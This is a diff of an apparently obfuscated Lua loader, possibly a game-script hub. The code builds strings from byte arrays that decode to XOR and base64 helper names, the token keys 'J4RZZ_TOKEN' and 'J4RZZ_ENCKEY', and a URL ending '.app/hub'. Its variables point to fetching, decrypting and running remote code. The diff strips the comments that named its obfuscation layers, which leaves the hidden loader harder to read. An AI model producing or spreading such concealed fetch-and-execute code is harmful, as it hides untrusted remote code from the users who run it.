@@ -1,19 +1,13 @@
--- layer 5: bytecode-style string reconstruct
+
 local function _sc(...) return string.char(...) end
 local function _su(t) return string.char(table.unpack(t)) end
-
--- layer 7: fake mutation vars — dimutasi terus, gak pernah dipakai logic
 local _phase=0x00
 local _mode=0xFF
 local _flag=math.floor(1*1)
-
--- dispatch table (layer 4)
 local _D={}
 local _DK1=_su({120,111,114,66,121,116,101})
 local _DK2=_su({98,54,52,100,101,99,111,100,101})
 local _DK3=_su({120,111,114,68,101,99,114,121,112,116})
-
--- global keys via bytecode array
 local _K =_su({74,52,82,90,90,95,84,79,75,69,78})
 local _E =_su({74,52,82,90,90,95,69,78,67,75,69,89})
 local _U =(function()
@@ -25,8 +19,6 @@ local _U =(function()
     local _t6={46,97,112,112,47,104,117,98}
     return _su(_t1).._su(_t2).._su(_t3).._su(_t4).._su(_t5).._su(_t6)
 end)()
-
--- dispatch definitions — defined BEFORE state machine to ensure they exist when called
 _D[_DK1]=function(_0xa,_0xb)
     local _r=(7*3)-(21)
     local _bt=(2^(4+4))/(math.floor(2/2))
@@ -101,7 +93,6 @@ _D[_DK3]=function(_data,_key)
     return table.concat(_out)
 end
 
--- layer 6: control flow flattening — state machine
 local _state=1
 local _tk,_ek,_url,_HS,_res,_ok1,_dec,_ok2,_fn,_fe,_ok3,_err
 
